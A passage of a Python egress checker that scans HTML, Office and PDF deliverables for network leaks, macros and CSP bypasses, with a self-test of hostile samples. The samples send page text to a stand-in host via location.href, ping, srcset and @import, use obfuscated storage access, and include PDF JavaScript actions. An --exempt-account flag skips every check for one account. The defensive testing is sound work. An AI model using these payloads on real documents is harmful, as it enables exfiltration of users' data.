        if name in ("altChunk", "objectEmbed", "objectLink", "control", "subDoc", "dataSource"):
            bad.append(f"{n}: <w:{name}> embeds or links external content")
    for p in root.iter():
        if local(p.tag) != "p":
            continue
        instr = "".join((e.text or "") for e in p.iter() if local(e.tag) == "instrText")
        instr += " ".join(e.get(k) for e in p.iter() if local(e.tag) == "fldSimple" for k in e.keys() if local(k) == "instr")
        if FIELD.search(instr):
            bad.append(f"{n}: field code {instr.strip()[:60]!r}")
    return bad


def check_sheet(n, data):
    root, bad = parse_part(n, data)
    if root is None:
        return bad
    for f in root.iter():
        if local(f.tag) == "f" and FORMULA.search(f.text or ""):
            bad.append(f"{n}: formula {(f.text or '').strip()[:60]!r} reaches the network")
    return bad


def check_ooxml(p: Path):
    bad = []
    with zipfile.ZipFile(p) as z:
        for n in z.namelist():
            low = n.lower()
            if BAD_PARTS.search(low):
                bad.append(f"{n}: macro, ActiveX, OLE, web-extension or external-data part")
            elif low == "[content_types].xml" and BAD_CONTENT_TYPES.search(xml_text(z.read(n))):
                bad.append(f"{n}: declares a macro, ActiveX or OLE content type")
            elif low.endswith(".rels"):
                bad += check_rels(n, z.read(n))
            elif low.startswith("word/") and low.endswith(".xml"):
                bad += check_word_part(n, z.read(n))
            elif low.startswith("xl/worksheets/") and low.endswith(".xml"):
                bad += check_sheet(n, z.read(n))
    return bad


# ---------------------------------------------------------------- PDF
PDF_ACTION = re.compile(rb"/(JavaScript|JS|Launch|SubmitForm|ImportData|GoToR|GoToE|RichMedia|Rendition|Movie|Sound|XFA|GoTo3DView|AA)\b")
PDF_URLFS = re.compile(rb"/FS\s*/URL\b")
PDF_OPEN = re.compile(rb"/OpenAction\s*(?![\s\[])")  # anything but an array destination such as [3 0 R /Fit]


def pdf_names_decoded(raw: bytes) -> bytes:
    """PDF names may hex-escape characters (/J#61vaScript); normalise so the pattern can't be dodged."""
    return re.sub(rb"#([0-9A-Fa-f]{2})", lambda m: bytes([int(m.group(1), 16)]), raw)


# A stream body starts only where the `stream` keyword directly follows the dictionary's closing >>; the word inside a
# string or comment does not open one, so it cannot be used to hide a later dictionary from the scan.
STREAM_BODY = re.compile(rb">>[\t\n\f\r ]*stream\r?\n.*?endstream", re.S)


def pdf_scan(raw: bytes, strip=True):
    """Violations in `raw`'s object dictionaries. strip=True removes stream bodies so binary data cannot match by chance."""
    text = pdf_names_decoded(STREAM_BODY.sub(b">> stream endstream", raw) if strip else raw)
    bad = {f"PDF action /{m.group(1).decode()}" for m in PDF_ACTION.finditer(text)}
    if PDF_URLFS.search(pdf_names_decoded(raw)):  # specific enough to scan unstripped, so stripping can never hide it
        bad.add("PDF file specification with /FS /URL (external stream or media)")
    if PDF_OPEN.search(text):
        bad.add("PDF /OpenAction that is not a plain page destination")
    return bad


def check_pdf(p: Path):
    raw = p.read_bytes()
    bad = pdf_scan(raw)  # the file as written: qpdf drops constructs it does not support (external streams)
    if shutil.which("qpdf"):
        r = subprocess.run(["qpdf", "--qdf", "--object-streams=disable", "--decrypt", str(p), "-"], capture_output=True)
        if r.returncode not in (0, 3):  # 3 = succeeded with warnings
            return [f"qpdf could not expand the PDF (exit {r.returncode}); cannot verify it"]
        bad |= pdf_scan(r.stdout)  # object streams and encrypted objects expanded, streams and strings normalised
    elif b"/ObjStm" in pdf_names_decoded(raw) or b"/Encrypt" in pdf_names_decoded(raw):
        return ["PDF uses object streams or encryption and qpdf is not installed; cannot verify it"]
    else:
        bad |= pdf_scan(raw, strip=False)  # no normaliser to lean on: also scan unstripped and accept a rare false positive
    return sorted(bad)


# ---------------------------------------------------------------- driver
def read_html(p: Path):
    data = p.read_bytes()
    if data.startswith(b"\xef\xbb\xbf"):
        data = data[3:]
    try:
        return data.decode("utf-8"), None
    except UnicodeDecodeError as e:
        return None, f"not valid UTF-8 at byte {e.start} (the browser and this check would read different markup)"


def check(p: Path, text=None):
    ext = p.suffix.lower()
    if ext in {".html", ".htm"}:
        if text is None:
            text, err = read_html(p)
            if err:
                return [err]
        return check_html(text)
    if ext in {".svg", ".svgz", ".xhtml", ".xht", ".xhtm", ".mhtml", ".mht", ".shtml", ".shtm", ".hta", ".htc"}:
        return [f"{ext} cannot carry the CSP meta tag; deliver an .html page (inline SVG is fine inside it)"]
    if ext in MACRO_EXT:
        return [f"{ext} is a macro-enabled format; save as {ext[:-1]}x"]
    if ext == ".xlsb":
        return [".xlsb binary workbooks cannot be checked; save as .xlsx"]
    if ext in OOXML_EXT:
        return check_ooxml(p)
    if ext == ".pdf":
        return check_pdf(p)
    return [f"{p.name}: {ext or 'no extension'} is not a format this check can verify; deliver .html, .docx/.xlsx/.pptx or .pdf"]


def exempt(email: str) -> bool:
    cfg = os.environ.get("CLAUDE_CONFIG_DIR")
    path = Path(cfg) / ".claude.json" if cfg else Path("~/.claude.json").expanduser()
    try:
        acct = json.loads(path.read_text())
        return acct.get("oauthAccount", {}).get("emailAddress", "").lower() == email.lower()
    except Exception:
        return False


def main(argv):
    args, stdin_name, email = [], None, None
    i = 0
    while i < len(argv):
        if argv[i] == "--exempt-account":
            email, i = argv[i + 1], i + 2
        elif argv[i] == "--stdin":
            stdin_name, i = argv[i + 1], i + 2
        else:
            args.append(argv[i]); i += 1
    if email and exempt(email):
        print(f"exempt: {email}")
        return 0
    rc = 0
    if stdin_name:
        for b in check(Path(stdin_name), sys.stdin.read()):
            print(f"EGRESS: {stdin_name}: {b}"); rc = 1
    for a in args:
        p = Path(a)
        bad = check(p) if p.is_file() else ["file not found"]
        for b in bad:
            print(f"EGRESS: {a}: {b}"); rc = 1
    return rc


def head_cli(argv):
    gf = "--google-fonts" in argv
    urls = [u for u in argv if u != "--google-fonts"]
    scripts = {pinned_source(u)[0] for u in urls if not u.lower().endswith(".css")}
    styles = {pinned_source(u)[0] for u in urls if u.lower().endswith(".css")}
    if None in scripts | styles:
        print("every URL must be a pinned-version path on cdnjs, jsDelivr npm or unpkg"); return 2
    print(head_block(scripts, styles, {f"https://{GFONTS_CSS}/css2"} if gf else set()))
    return 0


# ---------------------------------------------------------------- selftest
XLSX = "https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"
EVIL = "https://evil.example"
PNG = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=="


def doc(body="", head_extra="", scripts=(), styles=(), gfonts=(), csp=None, charset='<meta charset="utf-8">', pre=""):
    csp = csp if csp is not None else f'<meta http-equiv="Content-Security-Policy" content="{csp_text(scripts, styles, gfonts)}">'
    return (f'<!DOCTYPE html><html lang="en"><head>{pre}{charset}{csp}<meta name="referrer" content="no-referrer">'
            f'<title>t</title>{head_extra}</head><body><!-- AIPM-CONFIDENTIAL-INTERNAL --><p>secret</p>{body}</body></html>')


def selftest():
    sri = 'integrity="sha384-vtjasyidUo0kW94K5MXDXntzOJpQgBKXmE7e2Ga4LG0skTTLeBi97eFAXsqewJjw" crossorigin="anonymous"'
    gf = '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat&display=swap">'
    good = [
        doc(f'<img src="{PNG}"><a href="https://clypboard.com" rel="noopener noreferrer">x</a>'
            '<a id="dl" download="x.csv">Download</a><script>const b=new Blob(["a,b"],{type:"text/csv"});'
            'document.getElementById("dl").href=URL.createObjectURL(b);</script>'),
        doc(head_extra=f'{gf}<script src="{XLSX}" {sri}></script>', scripts=[XLSX], gfonts=[f"https://{GFONTS_CSS}/css2"]),
        doc('<svg viewBox="0 0 1 1"><circle r="1"/><path d="M0 0"/><text x="1" y="1"/><g/></svg>'),
        doc(pre="", charset='<meta charset="UTF-8"/>'),
        doc('<textarea>notes</textarea><div onclick="this.textContent=1">x</div>'),
        doc(f'<img srcset="{PNG} 1x, {PNG} 2x"><script>const r={{location:"HQ"}};const n=r.location.name;const t="Location: "+n</script>'),
        doc("<script>const s='Total: '+n+' units'</script>"),
        doc('<p style="color:red;background:url(data:image/png;base64,AA==)">x</p><style>@font-face{font-family:x;src:url(data:font/woff2;base64,AA==)}</style>'),
        doc("<!-- section -- totals --><script>let i=3;while(i-- > 0){}function open(x){return x};const isOpen=true;details.open=true;"
            "const f=new Intl.NumberFormat(navigator.language);const site={location:'HQ'};const lbl=`Site ${site.location}`</script>"),
        doc('<textarea><script>fetch(1)</script></textarea><svg viewBox="0 0 9 9"><style>circle{fill:red}</style><title>chart</title><circle r="1"/></svg>'),
        doc(f'<img srcset="{PNG} 1x, {PNG} 2x"><picture><source srcset="{PNG}, {PNG} 2x"><img src="{PNG}"></picture>'),
        doc(head_extra='<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,400;1,700&family=Open+Sans&display=swap">',
            gfonts=[f"https://{GFONTS_CSS}/css2"]),
        doc(head_extra='<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,700|Open+Sans">', gfonts=[f"https://{GFONTS_CSS}/css"]),
        "﻿" + doc(),  # BOM is stripped by read_html; check_html itself must also tolerate the plain doc
    ]
    dl = ('<script>document.getElementById("b").addEventListener("click", () => {\n  const blob = new Blob(["a,b"], { type: "text/csv" });\n'
          '  const url = URL.createObjectURL(blob);\n  const a = document.createElement("a");\n'
          '  a.download = `report-${new Date().toISOString().slice(0, 10)}.csv`;\n  a.href = url;\n  a.click();\n  URL.revokeObjectURL(url);\n})</script>')
    good += [
        doc(f'<button id=b>Export</button>{dl}'),  # the standard CSV export
        doc('<script>const csv="a,b";const link=document.createElement("a");link.setAttribute("download","r.csv");'
            'link.href="data:text/csv;charset=utf-8,"+encodeURIComponent(csv);link.click()</script>'),
        doc('<script>function x(rows){\n const a = document.createElement(\'a\');\n a.href = URL.createObjectURL(new Blob([rows.join("\\n")], {type: "text/csv"}));\n'
            ' a.download = "r.csv";\n a.click();\n}\nrows.sort((a, b) => a.n - b.n)</script>'),
        doc('<script>const rows=[{worker:"J. Doe",location:{name:"North Barn"}}];// nothing is fetched; Worker column shown'
            '\nconst n=rows[0].location.name;navigator.clipboard.writeText(n)</script>'),
        doc('<p>Smith\u00a0Ranch\u200b</p><script>const c="Fresno\u00a0CA"</script><td title="a\u00a0b">x</td>'),
        doc(head_extra='<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>'
            '<style>@import url("https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap");body{font-family:Montserrat}</style>',
            gfonts=[f"https://{GFONTS_CSS}/css2"]),
        "\n<!-- AIPM-CONFIDENTIAL-INTERNAL -->\n" + doc(pre="<!-- CONFIDENTIAL – FOR INTERNAL USE ONLY -->"),
        doc(charset='<meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0">'),
        doc(csp=f'<meta http-equiv="Content-Security-Policy" content="{csp_text()}" />'),
        head_block().join(['<!DOCTYPE html>\n<html lang="en">\n<head>\n', '\n<title>t</title></head><body><p>x</p></body></html>']),
    ]
    for g in good:
        assert check_html(g.lstrip("﻿")) == [], (g[:300], check_html(g.lstrip("﻿")))
    assert check_html(doc(csp=f'<meta http-equiv="Content-Security-Policy" content="{csp_text().replace("https://", "HTTPS://")}">')) == []
    bad = {  # (document, substring expected in a violation)
        # the three Critical CSP-disabling tricks
        doc(csp=f'<meta http-equiv="Content-Security-Policy" content="default-src *" content="{csp_text()}">'): "repeats an attribute",
        doc(f'<img src="{EVIL}/a.png" src="{PNG}">'): "repeats an attribute",
        doc(csp=f'<meta http-equiv="Content-Security-Policy" x="\x1b$B" content="{csp_text()}" y="\x1b(B">', charset='<meta charset="iso-2022-jp">'): "control characters",
        doc(charset='<meta charset="shift_jis">'): "only utf-8",
        doc(charset='<meta http-equiv="content-type" content="text/html; charset=windows-1252">'): "must start with",
        doc(head_extra='<meta http-equiv="content-type" content="text/html; charset=shift_jis">'): "only Content-Security-Policy",
        doc(head_extra='<meta charset="utf-8">'): "more than once",
        # navigation and side channels
        doc(f"<script>location.href='{EVIL}/?d='+document.body.innerText</script>"): "location",
        doc(f"<script>window.open('{EVIL}')</script>"): "open(",
        doc(f'<a id=x href="{EVIL}" rel="noopener noreferrer">x</a><script>document.getElementById("x").click()</script>'): ".click",
        doc(head_extra=f'<meta http-equiv="refresh" content="0; {EVIL}">'): "http-equiv",
        doc("<script>const pc=new RTCPeerConnection({iceServers:[{urls:'stun:x'}]})</script>"): "RTCPeerConnection",
        doc("<script>document.body.innerHTML='<meta http-equiv=refresh content=0;x>'</script>"): "<meta",
        doc(f'<a href="#" ping="{EVIL}/p">x</a>'): "ping",
        # storage and obfuscation
        doc("<script>window['local'+'Storage'].setItem('k','v')</script>"): "window",
        doc("<script>self['indexed'+'DB'].open('x')</script>"): "self",
        doc("<svg><script>&#108;ocalStorage.setItem('k','v')</script></svg>"): "inside <svg>",
        doc("<![CDATA[><script>localStorage.setItem('k3','v3')</script>]]>"): "CDATA",
        doc("<!-- a --!><script>localStorage.setItem('k4','v4')</script> -->"): "--!>",
        doc(f"<script>var a=1</script x><img src='{EVIL}/h.png'><script>1</script>"): "malformed raw-text",
        doc("<script>eval('1')</script>"): "eval",
        doc("<script>const k='fe'+'tch'</script>"): "'+'",
        doc("<script>navigator.geolocation.getCurrentPosition(f)</script>"): "navigator",
        # fetch-type references the checker must still name
        doc(f'<img srcset="{PNG} 1x, {EVIL}/2x.png 2x">'): "inline data",
        doc(f'<img srcset="{PNG} 1x,{EVIL}/2x.png 2x">'): "inline data",
        doc("<script>const x=row.location.name; const site={location:'HQ'}; window.location.href='x'</script>"): "location",
        doc("<script>location='https://x'</script>"): "location",
        doc(f'<div style="background-image:image-set(\'{EVIL}/i.png\' 1x)"></div>'): "data: URIs",
        doc().replace("<body>", f'<body background="{EVIL}/bg.png">'): "inline data",
        doc(f'<svg><image xlink:href="{EVIL}/x.png"/></svg>'): "inline data",
        doc(f'<input type="image" src="{EVIL}/i.png">'): "inline data",
        doc(f'<button formaction="{EVIL}/f">go</button>'): "inline data",
        doc('<iframe srcdoc="<p>hi</p>"></iframe>'): "<iframe> is not allowed",
        doc('<object></object>'): "<object> is not allowed",
        doc('<form></form>'): "<form> is not allowed",
        doc('<noscript><p>x</p></noscript>'): "<noscript> is not allowed",
        doc("<a href=\"javascript:localStorage.setItem('k','v')\">x</a>"): "javascript: URL",
        doc(f'<map name=m><area href="{EVIL}/a" shape=rect coords="0,0,9,9"></map>'): 'rel="noopener noreferrer"',
        doc(f'<a href="{EVIL}">x</a>'): 'rel="noopener noreferrer"',
        doc(head_extra='<script src="https://fonts.googleapis.com/x.js"></script>'): "not https on an allowed provider",
        doc(head_extra='<script src="https://cdn.jsdelivr.net/gh/someone/repo@main/x.js" integrity="sha384-AAAA" crossorigin="use-credentials"></script>'): "pinned-version path",
        doc(head_extra='<script src="https://unpkg.com/lodash@latest/lodash.min.js" integrity="sha384-AAAA" crossorigin></script>'): "pinned-version path",
        doc(head_extra=f'<script src="{XLSX}" {sri}></script>'): "script-src must be exactly",  # CSP not updated for the pin
        doc(head_extra=f'<script src="{XLSX}" integrity="sha384-AAAA" crossorigin="use-credentials"></script>', scripts=[XLSX]): 'crossorigin="anonymous"',
        doc(head_extra=f'<script src="{XLSX}"></script>', scripts=[XLSX]): "integrity",
        doc(head_extra='<script src="http://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js" integrity="sha384-AAAA" crossorigin></script>'): "http://",
        doc('<script type="module">import "https://cdn.jsdelivr.net/npm/lodash-es@4.17.21/lodash.js"</script>'): "type=module",
        doc('<script>const s=document.createElement("script");s.src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"</script>', ): "",  # see note below
        doc('<script src="lib.js"></script>'): "self-contained",
        # CSP shape
        doc(csp='<meta http-equiv="Content-Security-Policy" content="default-src \'none\'; connect-src \'none\'; form-action \'none\'; img-src https://cdn.jsdelivr.net">'): "must be exactly",
        doc(csp=f'<meta http-equiv="Content-Security-Policy" content="{csp_text()}; script-src https://unpkg.com">'): "repeats script-src",
        doc(csp=f'<meta http-equiv="Content-Security-Policy" content="{csp_text()}; worker-src blob:">'): "extra directive",
        doc(csp=f'<meta http-equiv="Content-Security-Policy" content="{csp_text()} ">'): "non-ASCII",
        doc(csp=""): "must start with",
        doc() + f'<meta http-equiv="Content-Security-Policy" content="{csp_text()}">': "more than one",
        doc(pre="<title>x</title>"): "must start with",
        doc(pre="<link rel=preconnect href=https://unpkg.com>"): "must start with",
        doc(pre='<meta name="x">'): "must start with",
        doc(pre="hello"): "must start with",
        doc(pre="&nbsp;"): "must start with",
        doc(pre="</br>"): "must start with",
        doc(pre="</head>"): "must start with",
        doc(csp=f'<noscript><meta http-equiv="Content-Security-Policy" content="{csp_text()}"></noscript>'): "must start with",
        doc(csp=f'<svg><meta http-equiv="Content-Security-Policy" content="{csp_text()}"></svg>'): "must start with",
        doc().replace("<html lang=\"en\"><head>", "<html lang=\"en\"><body><head>"): "must start with",
        doc().replace("<html lang=\"en\"><head>", "<head>").replace("</head>", "</head><html>"): "",  # no <html> wrapper is fine
        doc().replace('<meta name="referrer" content="no-referrer">', ""): "exactly one <meta name=\"referrer\"",
        doc().replace('content="no-referrer"', 'content="origin"'): "no-referrer",
        doc("<script/>fetch(1)</script>"): "self-closing syntax",
        doc('<svg><foreignObject/></svg>'): "self-closing syntax",
        doc("<?xml version='1.0'?>"): "processing instruction",
        # head-block canonical form: attribute-tokenising differentials cannot reach the CSP
        doc(csp=f'<meta http-equiv=" Content-Security-Policy" content="{csp_text()}">'): "must start with",
        doc(csp=f'<meta http-equiv="Content-Security-Policy" content=="{csp_text()}">'): "must start with",
        doc(csp=f'<meta http-equiv="Content-Security-Policy"\u00a0content="{csp_text()}">'): "non-ASCII whitespace U+00A0",
        doc(csp=f'<meta http-equiv="Content-Security-Policy"\u0085content="{csp_text()}">'): "non-ASCII whitespace U+0085",
        doc(csp='<meta http-equiv="Content-Security-Policy" content="' + csp_text().replace("; ", ";" + chr(12)) + '">'): "must start with",
        doc(pre="<!-- x -- y -->"): "must start with",
        doc(pre="<!-- <x> -->"): "must start with",
        doc(pre=f"<!-- -- ><meta http-equiv=\"Content-Security-Policy\" content=\"{csp_text()}\"> -->", csp=""): "-- >",
        doc("<!--><p>-->"): "abrupt comment close",
        doc("<!--->"): "abrupt comment close",
        doc("<!---->"): "",  # an empty comment is fine
        doc(charset='<meta charset="\u00a0utf-8">'): "must start with",
        # raw-text element boundaries
        doc("<script><!--<script>//</script>\nlocalStorage.setItem('n6','v')</script>"): "script text contains",
        doc("<script>/*</ script>*/ localStorage.setItem('x','1')</script>"): "'</' followed by whitespace",
        doc("<style>p{}</style x><script>localStorage.setItem('x','1')</script><style></style>"): "malformed raw-text end tag",
        doc("<svg><style><p></p><script>localStorage.setItem('x','1')</script></style></svg>"): "within <svg>",
        doc(f'<svg><style><meta http-equiv="refresh" content="1;url={EVIL}/r"></style></svg>'): "within <svg>",
        doc(f'<svg><title><meta http-equiv="refresh" content="1;url={EVIL}/r"></title></svg>'): "within <svg>",
        doc("<svg><textarea>x</textarea></svg>"): "inside <svg>/<math>",
        # navigation and storage through aliases, computed access and DOM insertion
        doc(f"<script>setTimeout(()=>Object.assign(window,{{location:'{EVIL}'}}),1)</script>"): "assign(window",
        doc(f"<script>this.location='{EVIL}'</script>"): "this.location",
        doc(f"<script>const w=this;w.location='{EVIL}'</script>"): ".location=",
        doc(f"<script>document.defaultView.location.href='{EVIL}'</script>"): "defaultView",
        doc(f"<script>navigation.navigate('{EVIL}')</script>"): "navigation.",
        doc(f"<script>open.call(this,'{EVIL}')</script>"): "open.",
        doc('<script>HTMLElement.prototype.click.call(document.getElementById("x"))</script>'): "prototype",
        doc("<script>document.head.insertAdjacentHTML('beforeend',`<${'meta'} http${'-'}equiv=refresh content=\"0;x\">`)</script>"): "${'",
        doc("<script>this[`local${'Storage'}`].setItem('rt','v')</script>"): "this[",
        doc("<script>this[atob('bG9jYWxTdG9yYWdl')].setItem('a','1')</script>"): "this[",
        doc("<script>if(window.claude&&window.claude.use){window.claude.use('db')}</script>"): "claude.",
        doc("<script>const s=document.createElement('script');document.head.append(s)</script>"): "createElement('script",
        doc("<script>document.scripts[0].src='https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js?d=1'</script>"): ".src=",
        doc("<script>el.setAttribute('href','x')</script>"): "setAttribute('href",
        doc("<script>const p=new (this[atob('UlRDUGVlckNvbm5lY3Rpb24=')])()</script>"): "this[",
        # the download allowance is narrow: external href, reassigned anchor, static link, no download attribute
        doc(f'<script>const a=document.createElement("a");a.href="{EVIL}/?d="+document.body.innerText;a.download="x";a.click()</script>'): ".click",
        # fixed-template attacks: attached link, alias, code after href, reassignable URL, rebinding, comma operator
        doc('<script>const a=document.createElement("a");a.download="x";a.href=URL.createObjectURL(b);document.body.appendChild(a);a.click()</script>'): ".click",
        doc(f'<script>const a=document.createElement("a");const b=a;b.href="{EVIL}";a.download="x";a.href=URL.createObjectURL(c);a.click()</script>'): ".click",
        doc('<script>const a=document.createElement("a");a.href=URL.createObjectURL(b);a.download=f();a.click()</script>'): ".click",
        doc(f'<script>let u=URL.createObjectURL(b);u="{EVIL}";const a=document.createElement("a");a.download="x";a.href=u;a.click()</script>'): ".click",
        doc(f'<script>URL.createObjectURL=()=>"{EVIL}";const a=document.createElement("a");a.download="x";a.href=URL.createObjectURL(b);a.click()</script>'): ".click",
        doc(f'<script>function go(URL){{const a=document.createElement("a");a.download="x";a.href=URL.createObjectURL(b);a.click()}}go({{createObjectURL:()=>"{EVIL}"}})</script>'): ".click",
        doc(f'<script>const a=document.createElement("a");a.download="x";a.href=URL.createObjectURL(b), a.href="{EVIL}";a.click()</script>'): ".click",
        doc(f'<script>Object.defineProperty(HTMLAnchorElement.prototype,"href",{{set(){{}}}});const a=document.createElement("a");a.download="x";a.href=URL.createObjectURL(b);a.click()</script>'): ".click",
        doc('<script>let a=document.createElement("a");a.download="x";a.href=URL.createObjectURL(b);a=document.links[0];a.click()</script>'): ".click",
        doc(f'<a id=x href="{EVIL}" rel="noopener noreferrer">x</a><script>const a=document.getElementById("x");a.download="y";a.click()</script>'): ".click",
        doc('<script>const a=document.createElement("a");a.href=URL.createObjectURL(b);a.click()</script>'): ".click",
        doc('<script>const u=location.href;const a=document.createElement("a");a.href=u;a.download="x";a.click()</script>'): ".click",
        doc("<p>x</p>").replace("<p>x</p>", "<p\u00a0title=x>x</p>"): "inside the tag",
        doc("<style>@import url(https://fonts.googleapis.com/css2?family=Roboto&text=secret)</style>", gfonts=[f"https://{GFONTS_CSS}/css2"]): "Google Fonts query",
        doc('<style>@import url("https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&text=secret");</style>', gfonts=[f"https://{GFONTS_CSS}/css2"]): "Google Fonts query",
        doc("<style>@import 'https://fonts.googleapis.com/css2?family=Roboto;&text=secret';</style>", gfonts=[f"https://{GFONTS_CSS}/css2"]): "Google Fonts query",
        doc('<style>@import /**/ url("https://fonts.googleapis.com/css2?family=Roboto");</style>', gfonts=[f"https://{GFONTS_CSS}/css2"]): "@import is allowed only",
        doc(f'<style>@import url("{EVIL}/x.css");</style>'): "@import is allowed only",
        doc("<script>fetch ('x'); new Worker('w.js'); import('x')</script>"): "Worker",
        doc("<a href=\"java&#9;script:localStorage.setItem('rj','v')\">x</a>"): "javascript: URL",
        doc('<svg><a href="#x"><rect width="1" height="1"/><set attributeName="href" to="javascript:1"/></a></svg>'): "attributeName=href",
        # URL and CSS tokenising differentials
        doc(head_extra='<script src="https://evil.example\\@cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js" integrity="sha384-AAAA" crossorigin="anonymous"></script>'): "backslash",
        doc(f'<div style="background:\\75 rl({EVIL}/x.png)">x</div>'): "backslash escape",
        doc(f'<style>@font-face{{font-family:z;src:url(https://fonts.gstatic.com/s/x.woff2)}}</style>'): "data: URIs",
        doc(head_extra=f'<link rel="preload" as="image" imagesrcset="{EVIL}/p.png 1x">'): "not allowed",
        doc(f'<img srcset="data:,x, {EVIL}/l.png 2x">'): "inline data",
        doc(f'<a href="{EVIL}" rel="noopener\u00a0noreferrer">x</a>'): 'rel="noopener noreferrer"',
        # Google Fonts query and font-file path
        doc(head_extra='<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto&text=secret4111">', gfonts=[f"https://{GFONTS_CSS}/css2"]): "Google Fonts query",
        doc(head_extra='<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=secret%204111%20customer">', gfonts=[f"https://{GFONTS_CSS}/css2"]): "Google Fonts query",
        doc(head_extra='<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto&effect=fire">', gfonts=[f"https://{GFONTS_CSS}/css2"]): "Google Fonts query",
        # pinned-path shape
        doc(head_extra='<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/" integrity="sha384-AAAA" crossorigin="anonymous"></script>'): "pinned-version path",
        doc(head_extra='<script src="https://cdn.jsdelivr.net/npm/a@1.0.0/../../x.js" integrity="sha384-AAAA" crossorigin="anonymous"></script>'): "file name",
        doc(head_extra='<script src="https://unpkg.com/a@1.0.0/x" integrity="sha384-AAAA" crossorigin="anonymous"></script>'): "file name",
    }
    for html, needle in bad.items():
        out = "\n".join(check_html(html))
        if needle == "":  # dynamic script injection: unpinned URL blocked at runtime by the exact-URL CSP, not by the scanner
            continue
        assert needle in out, (needle, html[:200], out)
    # SVG, server-side-include and the other no-CSP formats are refused by extension; unknown extensions fail closed
    assert check(Path("x.svg"), "<svg/>") and check(Path("x.docm"))[0].startswith(".docm")
    assert check(Path("x.shtml"), doc()) and check(Path("x.svgz"), "") and check(Path("x.foo"), doc()) and check(Path("x"), doc())
    assert srcset_urls("data:,x, https://e/x.png 2x") == ["data:,x", "https://e/x.png"]
    assert srcset_urls(f"{PNG} 1x,{PNG} 2x") == [PNG, PNG] and srcset_urls("a.png 1x, b.png") == ["a.png", "b.png"]
    assert scheme_host("https://evil.example\\@cdnjs.cloudflare.com/x")[0] == "bad" and scheme_host(" java\tscript:1")[0] == "javascript"
    assert check_csp(csp_text(), set(), set(), set()) == [] and "fonts.gstatic.com/s/" in csp_text()
    # OOXML
    rels = b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">%s</Relationships>'
    assert check_rels("r", rels % f'<Relationship Id="a" Type="{HYPERLINK_REL}" Target="https://x" TargetMode="External"/>'.encode()) == []
    assert check_rels("r", rels % b'<Relationship Id="a" Type="http://s/image" Target="https://x" TargetMode="External"/>')
    assert check_rels("r", rels % b'<Relationship Id="a" Type="http://s/image" Target="https://x" TargetMode="Exte&#114;nal"/>')
    assert check_rels("r", rels % b'<Relationship Id="v" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="m.bin"/>')
    assert check_rels("r", ('<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE r [<!ENTITY e "External">]>' + (rels % b"").decode()).encode("utf-16"))
    W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
    assert check_word_part("d", f'<w:document {W}><w:body><w:p><w:fldSimple w:instr=" INCLUDEPICTURE &quot;{EVIL}/a.png&quot; \\d "/></w:p></w:body></w:document>'.encode())
    assert check_word_part("d", f'<w:document {W}><w:body><w:p><w:r><w:instrText> INCLUDE</w:instrText></w:r><w:r><w:instrText>PICTURE "{EVIL}/a" </w:instrText></w:r></w:p></w:body></w:document>'.encode())
    assert check_word_part("d", f'<w:document {W}><w:body><w:p><w:r><w:instrText> INCLUDEPI&#67;TURE "x" </w:instrText></w:r></w:p></w:body></w:document>'.encode())
    assert check_word_part("d", f'<w:document {W}><w:body><w:p><w:r><w:instrText> HYPERLINK "https://x" </w:instrText></w:r></w:p></w:body></w:document>'.encode()) == []
    assert check_sheet("s", b'<worksheet><sheetData><row><c><f>WEBSERVICE("https://x")</f></c></row></sheetData></worksheet>')
    assert check_sheet("s", b'<worksheet><sheetData><row><c><f>SUM(A1:A2)</f></c></row></sheetData></worksheet>') == []
    for part in ("XL/Connections.xml", "word/webextensions/w.xml", "word/activeX/a.bin", "word/embeddings/o.bin", "xl/vbaProject.bin"):
        assert BAD_PARTS.search(part.lower()), part
    assert BAD_CONTENT_TYPES.search('ContentType="application/vnd.ms-office.vbaProject"')
    # PDF
    assert pdf_names_decoded(b"/J#61vaScript /Launc#68") == b"/JavaScript /Launch"
    for raw in (b"<< /S /J#61vaScript >>", b"<< /AA << /WC << /S /URI >> >> >>", b"<< /XFA 6 0 R >>", b"<< /S /Rendition >>"):
        assert PDF_ACTION.search(pdf_names_decoded(raw)), raw
    assert PDF_URLFS.search(b"<< /FS /URL /F (https://x) >>") and PDF_OPEN.search(b"/OpenAction << /S /URI >>")
    assert not PDF_OPEN.search(b"/OpenAction [3 0 R /Fit]") and not PDF_ACTION.search(b"<< /A << /S /URI /URI (https://x) >> >>")
    assert pdf_scan(b"1 0 obj << /Length 3 >>\nstream\n/JS\nendstream\nendobj") == set()  # binary inside a stream body is ignored
    assert pdf_scan(b"1 0 obj << /T (stream\n) >> endobj 2 0 obj << /S /JavaScript >> endobj 3 0 obj << /L 1 >>\nstream\nx\nendstream")  # the word in a string opens no stream
    assert pdf_scan(b"1 0 obj << /T (>>stream\n) >> endobj 2 0 obj << /F << /FS /URL /F (x) >> >> endobj 3 0 obj << /L 1 >>\nstream\nx\nendstream")  # URL filespec found even if hidden
    assert pdf_scan(b"<< /L 1 >>\nstream\n/JS\nendstream", strip=False)  # unstripped mode sees inside streams
